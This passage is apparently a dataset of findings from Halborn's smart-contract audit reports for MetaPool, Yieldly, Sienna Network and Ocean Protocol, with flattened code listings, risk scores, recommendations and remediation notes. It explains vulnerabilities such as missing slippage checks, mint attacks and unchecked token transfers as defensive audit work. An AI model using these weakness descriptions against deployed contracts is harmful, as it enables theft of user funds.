to avoid being front-run and losing tokens in transactions towards these smart contracts. Code Location: Listing 6: contracts/LiquidUnstakePool.sol 108 function deposit ( uint _assets , 109 address _receiver 110 111 ) public override validDeposit ( _assets ) returns ( uint ) 23 Listing 7: contracts/LiquidUnstakePool.sol 119 function depositETH ( 120 121 ) external payable validDeposit ( msg . value ) returns ( uint ) address _receiver Listing 8: contracts/LiquidUnstakePool.sol 168 function redeem ( 169 170 171 172 ) public virtual override nonReentrant returns ( uint ETHToSend ) uint _shares , address _receiver , address _owner Listing 9: contracts/Staking.sol 239 function deposit ( uint256 _assets , address _receiver ) 240 241 242 243 public override validDeposit ( _assets ) returns ( uint256 ) Listing 10: contracts/Staking.sol 252 function depositETH ( address _receiver ) 253 public 254 payable 255 validDeposit ( msg . value ) 256 returns ( uint256 ) BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:N/D:M/Y:N/R:N/S:U (3.4) Recommendation: It is recommended to include slippage checks in the aforementioned func- tions to allow EOA to set the minimum amount of tokens that they expect to receive by executing these functions. 24 References:  EIP-4626: Security Considerations Remediation Plan: SOLVED: The MetaPool team solved the issue by deploying new routers in order to handle EOA transactions and their respective slippage in the following commit IDs:  6b4e6770d840a8b90d3bda6ef31fb5de2665d753. 25 ", "labels": ["Halborn", "MetaPool_ETH_Staking", "Severity: Low"]}, {"title": "VAULTS ARE NOT EIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Following EIP-4626 definition, used ERC4626 custom implementations in scoped contracts are not fully EIP-4626 compliant due to the following functions are not meeting some EIPs requirements:  Withdraw function missing (LiquidUnstakePool).  maxDeposit function:  MUST return the maximum amount of assets deposit would allow to be deposited for receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset.  maxMint function:  MUST return the maximum amount of shares mint would allow to be deposited to the receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset.  Deposit function (LiquidUnstakePool):  MUST emit the Deposit event.  Redeem function (LiquidUnstakePool):  MUST emit the Withdraw event. 26 Code Location: Listing 11: contracts/LiquidUnstakePool.sol 158 function withdraw ( uint256 , 159 address , 160 address 161 162 ) public pure override returns ( uint ) { 163 164 } revert ( \" Use redeem \" ); Listing 12: contracts/LiquidUnstakePool.sol 138 emit AddLiquidity ( _caller , _receiver , _assets , _shares ); Listing 13: contracts/LiquidUnstakePool.sol 184 emit RemoveLiquidity ( msg . sender , _shares , ETHToSend , mpETHToSend ); BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:P/S:U (2.5) Recommendation: All aforementioned functions should be modified to meet the EIP-4626 specifications in order to avoid future compatibility issues. References:  EIP-4626: Specification Remediation Plan: SOLVED: The MetaPool team solved the issue in metapool-ethereum by stick- ing to EIP-4626 definitions in the following commit ID: 27  d6f739a7064ccfe965adb21ea498bcc1d5bb28ef. 28 ", "labels": ["Halborn", "MetaPool_ETH_Staking", "Severity: Low"]}, {"title": "USE CUSTOM ERRORS INSTEAD OF REVERT STRINGS TO SAVE GAS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Failed operations in several contracts are reverted with an accompanying message selected from a set of hard-coded strings. In the EVM, emitting a hard-coded string in an error message costs ~50 more gas than emitting a custom error. Additionally, hard-coded strings increase the gas required to deploy the contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Custom errors are available from Solidity version 0.8.4 up. Consider replacing all revert strings with custom errors. Usage of custom errors should look like this: Listing 14 1 error CustomError () ; 2 3 // ... 4 5 if ( condition ) 6 revert CustomError () ; 29 Remediation Plan: SOLVED: The MetaPool team solved the issue by following the aforementioned recommendation. 30 ", "labels": ["Halborn", "MetaPool_ETH_Staking", "Severity: Informational"]}, {"title": "USE UINT256 INSTEAD OF UINT IN FUNCTION ARGUMENTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In solidity, its well known that uint type is an alias of uint256 type which means that, at compilation time, declared uint variables are treated as uint256 variables, as well as function arguments. This condition is essential during ABI definition, since every argument whose type is uint will be assigned to uint256 type. Then, calling to this kind of function through its ABI definition should not be an issue, since uint will always be processed as uint256 in external contracts. However, using raw calls to contracts functions whose arguments contain an uint type could lead to errors and unexpected reverts if uint types are specified in the function signature of these raw calls due to function signatures using uint will mismatch with the actual signature that is using a uint256 type defined in the contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to change every uint type to uint256 in function arguments. Remediation Plan: SOLVED: The MetaPool team solved the issue in the following commit ID:  c86bac226b5cf581724b368385999cddda4e0bda. 31 ", "labels": ["Halborn", "MetaPool_ETH_Staking", "Severity: Informational"]}, {"title": "LOOP GAS USAGE OPTIMIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Multiple gas cost optimization opportunities were identified in the loops of scoped contracts:  Unnecessary reading of the array length on each iteration wastes gas.  Using != consumes less gas.  It is possible to further optimize loops by using unchecked loop index incrementing and decrementing.  Pre-increment ++i consumes less gas than post-increment i++. Code Location: Listing 15: contracts/Staking.sol 121 for ( uint i = 0; i < addresses . length ; i ++) Listing 16: contracts/Staking.sol 128 for ( uint i = 0; i < addresses . length ; i ++) Listing 17: contracts/Staking.sol 219 for ( uint i = 0; i < nodesLength ; i ++) BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) 32 Recommendation: It is recommended to cache array lengths outside of loops, as long the size is not changed during the loop. It is recommended to use the unchecked ++i operation to increment the It is noted that using values of the uint variable inside the loop. unchecked operations requires particular caution to avoid overflows, and their use may impair code readability. It is possible to save gas by using != inside loop conditions. Remediation Plan: SOLVED: The MetaPool team solved the issue in the following commit ID:  09e5810f590ecb890d914b42bfe6f7d8d085643a. 33 ", "labels": ["Halborn", "MetaPool_ETH_Staking", "Severity: Informational"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Smart contracts in metapool-ethereum use the floating pragma ^0.8. Con- tracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to en- sure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Risk Level: Likelihood - 0 Impact - 0 Recommendation: Consider locking the pragma version with known bugs for the compiler When possible, do not use version by removing the caret (^) symbol. floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: SOLVED: The MetaPool team solved the issue in the following commit ID:  f75a74db30d6ad74b7f78af95aabecde315967aa. 34 ", "labels": ["Halborn", "MetaPool_ETH_Staking", "Severity: Informational"]}, {"title": "TYPOS IN COMMENTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It has been identified that some comments contain typos. Although it is a comment, fixing it is recommended to improve code quality and readability in order to avoid confusions. Code Location: Listing 18: contracts/Staking.sol (Line 160) 160 // / @notice Update Withdrawal contract address 161 // / @dev Updater function 162 // / @notice Updates nodes total balance 163 // / @param _newNodesBalance Total current ETH balance from  validators 164 function updateNodesBalance ( uint _newNodesBalance ) external  onlyRole ( UPDATER_ROLE ) { BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: If possible, consider removing the Update Withdrawal comment. Remediation Plan: SOLVED: The MetaPool team solved the issue in the following commit ID:  2150d0bf5d3cd8194bf03802d64b2e7a6cb1526c. 35 ", "labels": ["Halborn", "MetaPool_ETH_Staking", "Severity: Informational"]}, {"title": "LACK OF MULTISIG PROGRAM", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf", "body": "The principal benefit of multisig is that it creates added redundancy in key management. While single signature addresses require only a single key for transactions, multisignature addresses require multiple keys. To protect against malicious admin, it may be necessary to use a multi signature. By using this mechanism, a malicious admin actions could be prevented. Code Location: 14 Example Definition: Listing 1: Multisig Implementation (Lines ) 2 goal account multisig new -T 2 account1 account2 account3 -d ~/ node / data 3 goal clerk multisig signprogram -p / tmp /* . teal -a account1 -A account2 -o / tmp / simple . lsig -d ~/ node / data Risk Level: Likelihood - 1 Impact - 3 Recommendation: In the contract, The multi-signature should be implemented over a creator account. Remediation Plan: SOLVED: Yieldly.Finance Team will monitor assets by a multi-signature address. 15 ", "labels": ["Halborn", "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1", "Severity: Low"]}, {"title": "MISSING PROXY ASSET DEFINITION ON THE FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf", "body": "In the Yieldly.Finance workflow, Escrow connection is made with a proxy contract. According to documentation, Escrow only allows transactions But, in the some of functions transactions dont go tied with proxy. through the Proxy asset. Code Location: Listing 2: winnerProgram Function (Lines 1) 1 2 3 4 5 6 7 8 9 let txn = await configs . winnerProgram ( account2 , escrowAddress , algoAppId , asaAppId , trackerAppId , winner , rateAppId ); Listing 3: assetOptoutApplication Function (Lines 1) 1 2 3 4 5 6 let txn1 = await configs . assetOptoutApplication ( account1 , escrowAddress , optingAppId , assetId ); Risk Level: Likelihood - 2 Impact - 2 16 Recommendation: It is recommended to construct transactions through a proxy which is interacting with escrow. Remediation Plan: SOLVED: Yieldly.Finance Team applied the necessary changes to communicate through the proxy. 17 ", "labels": ["Halborn", "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1", "Severity: Low"]}, {"title": "MISSING FREEZE/REVOKE ASSETS DEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf", "body": "When an asset is created, the contract can provide a freeze address and a defaultfrozen state. If the defaultfrozen state is set to true the corresponding freeze address must issue unfreeze transactions, one per account, to allow trading of the asset to and from that account. This may be useful in situations that require holders of the asset to pass certain checks prior to ownership. (KYC/AML) The clawback address, if specified, is able to revoke the asset from any account and place them in any other account that has previously opted-in. This may be useful in situations where a holder of the asset breaches some set of terms that you established for that asset. You could issue a freeze transaction to investigate, and if you determine that they can no longer own the asset, you could revoke the assets. Code Location: Risk Level: Likelihood - 1 Impact - 1 18 Recommendation: According to workflow, the application should activate freeze and revoke assets. If the application would rather ensure to asset holders that the application will never have the ability to revoke or freeze assets, set the clawback/freeze address to null. SOLVED: Yieldly.Finance Team confirmed the assets dontt have freeze/ clawback addresses. 19 ", "labels": ["Halborn", "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1", "Severity: Informational"]}, {"title": "MULTIPLE PRAGMA DEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf", "body": "It has been observed that different versions of the pragma are used on TEAL contracts. The pragma on the ESCROW contract is defined as 2. Code Location: Listing 4: Pragma Version 2 Functions (Lines ) 2 reward_fund_escrow . teal 3 reward_fund_close . teal 4 reward_fund_rates . teal 5 reward_fund_tracker . teal Risk Level: Likelihood - 1 Impact - 1 Recommendation: A common version of pragma (3) should be used across all contracts to avoid an unexpected workflows. SOLVED: Yieldly.Finance Team updated pragma version on the related con- tracts. 20 ", "labels": ["Halborn", "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1", "Severity: Informational"]}, {"title": "ALERTHUB SETUP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf", "body": "AlertHub is a tool that provides monitoring and real-time alerts on Algorand addresses so that users may manage the security of their accounts and the wider Algorand network. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to setup alerthub for real-time monitoring. help the operations proceed healthily and safely. It can SOLVED: Yieldly.Finance Team will set up Alerthub on the mainnet. 21 3.6 TESTING ACCESS CONTROL POLICIES ", "labels": ["Halborn", "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1", "Severity: Informational"]}, {"title": "POSSIBILITY TO CREATE POOLS WITH THE SAME PAIR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The AMM module allow users to create pairs (called exchanges) from native or custom assets by calling create_exchange function on factory contract. It relies on the token_type PartialEq implementation, that allows users to pair the same asset twice, which generates unexpected situations, e.g.: a user could withdraw more tokens than his fair share and affect other users in the pool. The verification asserts that both tokens addresses are not exactly equal, but a lowercase version of the address will be considered different from the uppercase one. Code Location: Listing 1: libraries/amm-shared/src/token_type.rs (Line 32) 26 impl <A : PartialEq > PartialEq for TokenType <A > { 27 fn eq (& self , other : & Self ) -> bool { 28 29 30 match ( self , other ) { ( Self :: CustomToken { contract_addr : l_contract_addr , .. }, Self :: CustomToken { contract_addr : r_contract_addr , .. } ) => l_contract_addr == r_contract_addr , ( Self :: NativeToken { denom : l_denom }, Self :: NativeToken { denom : r_denom } ) => l_denom == r_denom , _ => false 31 32 33 34 35 36 37 38 39 40 } } } 13 Risk Level: Likelihood - 4 Impact - 4 Recommendation: The PartialEq implementation for TokenType must be able to compare custom tokens correctly, taking the case into account. Remediation plan: RISK ACCEPTED: The Sienna.Network team accepted the risk for this finding. 14 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm", "Severity: High"]}, {"title": "EXCHANGE SWAP FEES ARE NOT STABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The exchange contract allows users to perform swaps between different assets, and comes with a predefined swap fee that capture part of the input amount and leaves it in the pool. However, that captured amount is not considered when performing the swap. To better explain this situation, we take a scenario with little liquidity:  Alice offers 1000 A to a (1000 A; 1000 B) pool with 0.3% swap fees.  3 A are captured from the offer, and the swap is performed on the (1000 A; 1000 B) pool with 997 A instead of a (1003 A; 1000 B) pool. This realizes the swap on a 1997 total A pool instead of 2000 A pool: 1) Without fee:  returned = 1000B - (1000A * 1000B)/ (1000A + 1000A)= 500B  balance after swap: 2000A, 500B 2) Excluding the fee from the pool (current scenario):  returned = 1000B - (1000A * 1000B)/ (1000A + 997A)= 499.25B  balance after swap: 2000A, 500.75B  commission: (500 - 499.25)/500 = 0.15% 3) Including the fee to the pool:  returned = 1000B - (1003A * 1000B)/ (1003A + 997A)= 498.5B  balance after swap: 2000A, 501.5B 15  commission: (500 - 498.5)/500 = 0.3% With a 0.3% commission, the user should receive 500B * (1-0.3%)= 498.5B, but the current scenario uses in fact a fee of 0.15%, that is function of the liquidity in the pool. The protocol is therefore failing to capture the wanted amount of commission, at expenses of the pool. Code Location: Listing 2: contracts/amm/exchange/src/contract.rs (Lines 676,680,684) // If not a simulation , need to subtract the incoming amount // from the pool offer_pool = ( offer_pool - offer . amount ) ?; 673 if !is_simulation { 674 675 676 677 } 678 let total_commission = swap_commission + sienna_commission ; 679 let offer_amount = ( offer . amount - total_commission ) ?; 680 Ok ( SwapInfo { 681 682 683 684 total_commission , swap_commission , sienna_commission , result : compute_swap ( offer_pool , balances [ token_index ^ 1] , offer_amount )? , 685 }) Risk Level: Likelihood - 3 Impact - 2 Recommendation: Include the retained commission within the offer_pool of swap computation, or only apply the fee on the returned amount. 16 Remediation plan: RISK ACCEPTED: The Sienna.Network team accepted the risk of this finding and also stated that fees should be deducted from the input amount as a business decision. 17 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm", "Severity: Low"]}, {"title": "DATA LEAKAGE ATTACKS BY ANALYZING METADATA OF CONTRACTS USAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Depending on a contracts implementation, an attacker could deanonymize In all the following information about the contract and its clients. scenarios, assume that an attacker has a local full node in its control. For example, it is possible for an attacker to create a list of every account that performs a swap. This attack is based on the length of the (encrypted) message sent to the attackers node: there is a significant difference of size between the only two queries. On one side, pair_info is short and doesnt take any parameter. On the other side, swap_simulation is longer and takes a parameter. This means that the inputs for queries on this contract would look like: \"pair_info\" {\"swap_simulation\": {\"offer\": some data}} Therefore, the attacker (a validator node or internet provider) can distinguish what query was called given the length of the message. If the message is long, the user might have asked for a swap simulation and could perform a swap transaction after that. Code Location: Listing 3: contracts/amm/exchange/src/contract.rs (Lines 182,202) 180 pub fn query <S : Storage , A : Api , Q : Querier >( deps : & Extern <S , A , Q >, msg : QueryMsg ) -> QueryResult { match msg { QueryMsg :: PairInfo => { let config = load_config ( deps ) ?; 181 182 183 184 18 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 } let balances = config . pair . query_balances ( & deps . querier , config . contract_addr , config . viewing_key .0 , ) ?; let total_liquidity = query_liquidity (& deps . querier , & config . lp_token_info ) ?; to_binary (& QueryMsgResponse :: PairInfo { liquidity_token : config . lp_token_info , factory : config . factory_info , pair : config . pair , amount_0 : balances [0] , amount_1 : balances [1] , total_liquidity , contract_version : CONTRACT_VERSION , }) } QueryMsg :: SwapSimulation { offer } => { let config = load_config ( deps ) ?; to_binary (& swap_simulation ( deps , config , offer ) ?) } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider applying remediation from the SCRT privacy model (same length in function names, outputs, same state accessing orders. . . ) Remediation plan: ACKNOWLEDGED: The Sienna.Network team acknowledged this finding. 19 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm", "Severity: Informational"]}, {"title": "MISMATCH BETWEEN ASSERTION AND ERROR DESCRIPTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the exchange contract, the description of the slippage check and the code do not match:  Description explains that slippage tolerance must be bewteen 0.1 and 0.9.  Verification ensures that slippage is contained between 0 and 1 excluded. The confusion between the code and the description could confuse users interacting with the contract. Code Location: Listing 4: contracts/amm/exchange/src/contract.rs (Lines 741,743) 741 if slippage . is_zero () || slippage >= Decimal256 :: one () { 742 743 return Err ( StdError :: generic_err ( format! (\" Slippage tolerance must be between 0.1 and 0.9 , got : {} \" , slippage )) 744 745 } ); Risk Level: Likelihood - 1 Impact - 1 20 Recommendation: Either change the code, or the error description, so that both are matching. Remediation plan: ACKNOWLEDGED: The Sienna team acknowledged this finding and also stated that if a mistake is made for whatever reason, it can quickly be corrected. 21 ", "labels": ["Halborn", "Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm", "Severity: Informational"]}, {"title": "MINT ATTACK AFTER NFT TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the FixedRateExchange and Dispenser contracts, users can transfer the ownership of NFT #1 to another user after having created a fixed rate exchange and dispenser instance. After transferring ownership, the roles were cleaned up; however, after the new owner created another fixed-rate exchange/dispenser instance, the original contract would once again have minting rights, allowing the first user to mint new tokens and collect base tokens. Code Location: The issues were present in the FixedRateExchange.sol and Dispenser.sol contracts. Risk Level: Likelihood - 5 Impact - 4 Recommendation: As this was due to the permissions set out in the fixed-rate exchange and dispenser contracts, the issue could be remediated by enforcing ownership of the accounts instead of the contract. Remediation Plan: SOLVED: The issue was fixed by the team after refactoring the permissions of the FixedRateExchanges and Dispenser contracts to accept as owners only the owner of NFT #1 and users with ERC20Deployer roles. 20 ", "labels": ["Halborn", "Ocean_Protocol", "Severity: High"]}, {"title": "MINT ATTACK WITH WORTHLESS TOKEN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the FixedRateExchange contract, users can create a new fixed-rate exchange associated with a datatoken using a worthless ERC20 token as The attacker would be able to swap their tokens for the base token. datatokens and then sell the datatokens to the first exchange. Risk Level: Likelihood - 5 Impact - 4 Recommendation: Since this was because any user could create a new fixed rate exchange, the issue could be solved by restricting unauthorized users from creating a fixed rate exchange. Remediation Plan: SOLVED: The issue was fixed by the team after refactoring the creation of the fixed-rate exchange functionality to only allow users with the role ERC20Deployer or the owner of NFT #1. 21 ", "labels": ["Halborn", "Ocean_Protocol", "Severity: High"]}, {"title": "DT TOKEN STAKE NOT CALCULATED SUCCESSFULLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Within the BPool contract, the order of instructions resulted in wrong calculations. After the users called the joinSwapExternAmountIn function, calculations were made on the provided supply and the pool share was minted. Later, the side staking bot (ssBot) would provide their share. However, the calculations were made on the totalSupply without taking into account that this would have changed after the shares were minting. This ultimately resulted in miscalculations in the future. Code Location: The issue was present in the Bpool.sol contract on line 1053, 1064 and 1042. Listing 1 ) external _lock_ returns ( uint256 poolAmountOut ) { // tokenIn = _baseTokenAddress ; require ( _finalized , \" ERR_NOT_FINALIZED \"); _checkBound ( _baseTokenAddress ); require ( tokenAmountIn <= bmul ( _records [ _baseTokenAddress ]. \" ERR_MAX_IN_RATIO \" ); // ask ssContract Record storage inRecord = _records [ _baseTokenAddress ]; poolAmountOut = calcPoolOutGivenSingleIn ( function joinswapExternAmountIn ( uint256 tokenAmountIn , uint256 minPoolAmountOut 1 2 3 4 5 6 7 8 9  balance , MAX_IN_RATIO ) , 10 11 12 13 14 15 16 17 18 19 inRecord . balance , inRecord . denorm , _totalSupply , _totalWeight , 22 ); 20 21 22 23  ); 24 25 26 27  , block . timestamp ); 28 29 30 31 32  tokenAmountIn ); 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  ssAmountIn ); 49 50 51 52 53 54 55 56 57 58  ssAmountIn ); tokenAmountIn require ( poolAmountOut >= minPoolAmountOut , \" ERR_LIMIT_OUT \" inRecord . balance = badd ( inRecord . balance , tokenAmountIn ); emit LOG_JOIN ( msg . sender , _baseTokenAddress , tokenAmountIn emit LOG_BPT ( poolAmountOut ); _mintPoolShare ( poolAmountOut ); _pushPoolShare ( msg . sender , poolAmountOut ); _pullUnderlying ( _baseTokenAddress , msg . sender , // ask the ssContract to stake as well // calculate how much should the 1 ss stake Record storage ssInRecord = _records [ _datatokenAddress ]; uint256 ssAmountIn = calcSingleInGivenPoolOut ( ssInRecord . balance , ssInRecord . denorm , _totalSupply , _totalWeight , poolAmountOut ); if ( ssContract . canStake ( _datatokenAddress , ssAmountIn )) { // call 1 ss to approve ssContract . Stake ( _datatokenAddress , ssAmountIn ); // follow the same path ssInRecord . balance = badd ( ssInRecord . balance , emit LOG_JOIN ( _controller , _datatokenAddress , ssAmountIn , block . timestamp ); emit LOG_BPT_SS ( poolAmountOut ); _mintPoolShare ( poolAmountOut ); _pushPoolShare ( _controller , poolAmountOut ); _pullUnderlying ( _datatokenAddress , _controller , 23 59 60 61 } } return poolAmountOut ; Risk Level: Likelihood - 4 Impact - 4 Recommendation: The issue could be solved by minting shares, after the ssBot provides its part to ensure the correct totalSupply amount is considered in the calculations. Remediation Plan: SOLVED: Ocean protocol amended the affected lines to ensure that the totalSupply argument used in the calculations matched between the users staking data tokens and the side staking bot - GitHub pull request fix. 24 ", "labels": ["Halborn", "Ocean_Protocol", "Severity: High"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "the BPool.sol, contracts, SideStaking.sol, FactoryRouter.sol ERC20Tempalte.sol, Dispenser. In sol, and FixedRateExchange.sol, the return values of the external transfer calls are not checked. It should be noted that token is not reverted in case of failure and returns false. If one of these tokens is used, a deposit would not be reverted if the transfer fails, and an attacker could deposit tokens for free. OPFCommunityFeeCollector.sol Code Location: FactoryRouter Listing 2: FactoryRouter.sol (Lines 275,299) 262 263 264 265 266 267 268 269 270 function buyDTBatch ( Operations [] calldata _operations ) external { for ( uint i = 0; i < _operations . length ; i ++) { [ Redacted for brevity ] } else if ( _operations [ i ]. operation ==  operationType . SwapExactOut ){ 271  exact Out 272 273 // calculate how much amount In we need for uint amountIn = IPool ( _operations [ i ]. source ) . getAmountInExactOut ( _operations [ i ]. tokenIn ,  _operations [ i ]. tokenOut , _operations [i ]. amountsOut ); 274 275 // pull amount In from user IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , amountIn ); 276 277 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , amountIn ); 25 278 279 280 281 282 283 284 285 286 287 // perform swap IPool ( _operations [i ]. source ) . swapExactAmountOut ( _operations [i ]. tokenIn , _operations [ i ]. amountsIn , _operations [ i ]. tokenOut , _operations [ i ]. amountsOut , _operations [ i ]. maxPrice ); // send amount out back to user require ( IERC20 ( _operations [i ]. tokenOut ) . transfer ( msg . sender , _operations [ i ]. amountsOut  ) , ' Failed MultiSwap '); 288 289 } else if ( _operations [ i ]. operation ==  operationType . FixedRate ) { 290 291 292 // get datatoken address (, address datatoken , , , , , , , , , ,) = IFixedRateExchange ( _operations [ i ]. source ).  getExchange ( _operations [i ]. exchangeIds ); 293 294 295 296 // get tokenIn amount required for dt out ( uint baseTokenAmount , , ,) = IFixedRateExchange ( _operations [ i ]. source ). calcBaseInGivenOutDT ( _operations [ i ].  exchangeIds , _operations [i ]. amountsOut ); 297 298 299 // pull tokenIn amount IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , baseTokenAmount ); 300 301 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , baseTokenAmount ); 302 303 304 // perform swap IFixedRateExchange ( _operations [ i ]. source ) . buyDT ( _operations [ i ]. exchangeIds , _operations [  i ]. amountsOut , _operations [ i ]. amountsIn ); 305 306 // send dt out to user IERC20 ( datatoken ). transfer ( msg . sender ,  _operations [ i ]. amountsOut ); 307 308 309 310 } else { IDispenser ( _operations [ i ]. source ) . dispense ( _operations [ i ]. tokenOut , _operations [  i ]. amountsOut , msg . sender ); 311 312 } 26 313 314 315 } } 27 Dispenser Listing 3: Dispenser.sol (Line 248) 236 237 238 239 240 241 242 243 244 245 246  ); 247 248 249  ); 250 251 function ownerWithdraw ( address datatoken ) external { require ( datatoken != address (0) , ' Invalid token contract address ' ); require ( datatokens [ datatoken ]. owner == msg . sender , ' Invalid owner ' ); IERC20Template tokenInstance = IERC20Template ( datatoken ); uint256 ourBalance = tokenInstance . balanceOf ( address ( this ) if ( ourBalance >0) { tokenInstance . transfer ( msg . sender , ourBalance ); emit OwnerWithdrawed ( datatoken , msg . sender , ourBalance } } Dispenser Listing 4: Dispenser.sol (Line 227) 187 function dispense ( address datatoken , uint256 amount , address  destination ) external payable { 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 require ( datatoken != address (0) , ' Invalid token contract address ' ); require ( datatokens [ datatoken ]. active == true , ' Dispenser not active ' ); require ( amount > 0, ' Invalid zero amount ' ); require ( datatokens [ datatoken ]. maxTokens >= amount , ' Amount too high ' 28 203 204 205 206  , 207 208 209 210 211 212 ); if ( datatokens [ datatoken ]. allowedSwapper != address (0) ) { require ( datatokens [ datatoken ]. allowedSwapper == msg . sender \" This address is not allowed to request DT \" ); } IERC20Template tokenInstance = IERC20Template ( datatoken ); uint256 callerBalance = tokenInstance . balanceOf (  destination ); 213 214 215 216 217  ); 218  this ))){ 219 220 221 222 223 224 225 226 227 228 229 } require ( callerBalance < datatokens [ datatoken ]. maxBalance , ' Caller balance too high ' ); uint256 ourBalance = tokenInstance . balanceOf ( address ( this ) if ( ourBalance < amount && tokenInstance . isMinter ( address ( // we need to mint the difference if we can tokenInstance . mint ( address ( this ) , amount - ourBalance ); ourBalance = tokenInstance . balanceOf ( address ( this )); } require ( ourBalance >= amount , ' Not enough reserves ' ); tokenInstance . transfer ( destination , amount ); emit TokensDispensed ( datatoken , destination , amount ); FixedRateExchange Listing 5: FixedRateExchange.sol (Lines 397,398,399,400) 394 395 } else { exchanges [ exchangeId ]. dtBalance = ( exchanges [  exchangeId ]. dtBalance ) 396 397 